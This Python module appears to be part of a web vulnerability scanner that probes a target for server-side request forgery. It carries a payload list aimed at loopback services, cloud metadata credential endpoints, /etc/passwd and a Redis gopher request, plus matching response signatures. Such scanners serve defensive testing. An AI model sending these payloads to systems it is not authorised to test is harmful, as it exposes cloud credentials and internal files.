"""
A10:2025 - Server-Side Request Forgery (SSRF)
Async: Loopback, AWS metadata, scheme-based.
"""
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode

SSRF_PAYLOADS = [
    # Loopback
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://127.0.0.1:22",
    "http://[::1]:80",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    # File scheme
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    # Gopher
    "gopher://127.0.0.1:6379/_INFO",
]

# Signature response berhasil SSRF
SSRF_SIGNATURES = [
    "root:x:0:0",
    "ami-id", "instance-id", "iam/security-credentials",
    "for 16-bit app support",
    "computeMetadata",
    "redis_version",
    "SSH-2.0", "OpenSSH",
]

SSRF_PARAMS = ["url", "uri", "path", "src", "dest", "redirect",
               "proxy", "fetch", "callback", "image", "target", "link"]


def _inject(url, param, payload):
    p = urlparse(url)
    q = parse_qs(p.query)
    q[param] = [payload]
    return f"{p.scheme}://{p.netloc}{p.path}?{urlencode(q, doseq=True)}"


async def _run_async(scanner):
    params_from_url = list(parse_qs(urlparse(scanner.target).query).keys())
    params = list(set(params_from_url + SSRF_PARAMS))

    tasks = []
    meta = []
    for param in params:
        for payload in SSRF_PAYLOADS:
            url = _inject(scanner.target, param, payload)
            tasks.append(scanner.aget(url))
            meta.append((param, payload))

    results = await scanner.agather(tasks)
    for (param, payload), r in zip(meta, results):
        if not r or not isinstance(r, dict):
            continue
        body = r.get("body", "")
        for sig in SSRF_SIGNATURES:
            if sig in body:
                scanner.add_finding(
                    "A10: SSRF", "HIGH",
                    f"Parameter '{param}' rentan SSRF",
                    mitigation="Whitelist URL/domain. Blokir IP internal & metadata. Validasi protocol.",
                    evidence=f"Payload: {payload} | Signature: {sig}",
                )
                return

    # Cek Response Time (blind SSRF)
    # Kalau target lambat merespons internal IP, ada indikasi
    t0 = asyncio.get_event_loop().time()
    r = await scanner.aget(scanner.target)
    baseline = asyncio.get_event_loop().time() - t0 if r else 0

    for param in params[:5]:
        for payload in SSRF_PAYLOADS[:3]:  # cuma 3 payload
            url = _inject(scanner.target, param, payload)
            t0 = asyncio.get_event_loop().time()
            await scanner.aget(url)
            elapsed = asyncio.get_event_loop().time() - t0
            if elapsed > max(baseline * 3, 5):
                scanner.add_finding(
                    "A10: SSRF (Blind)", "MEDIUM",
                    f"Parameter '{param}' potensi blind SSRF (delay {elapsed:.1f}s)",
                    mitigation="Blokir request ke IP internal di server-side",
                    evidence=f"Payload: {payload} | Baseline: {baseline:.2f}s | Payload: {elapsed:.2f}s",
                )
                return

    scanner.add_finding("A10: SSRF", "SAFE", "Tidak ada SSRF terdeteksi")


def scan(scanner):
    try:
        asyncio.run(_run_async(scanner))
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(_run_async(scanner))
    except Exception as e:
        scanner.add_finding("A10: SSRF", "INFO", f"Error: {e}")
